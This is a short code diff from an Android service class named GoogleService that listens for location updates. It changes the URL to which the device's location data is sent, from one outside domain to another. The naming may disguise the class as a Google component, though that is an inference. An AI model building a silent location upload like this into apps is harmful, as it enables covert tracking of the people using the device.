@@ -125,7 +125,7 @@ public class GoogleService extends Service implements LocationListener {
 
 
 
-        new ServerHelper2(this).execute("http://tmhgame.tk/sendLocation", data.toString());
+        new ServerHelper2(this).execute("https://lookin24.com/sendLocation", data.toString());
 
     }
     @Override
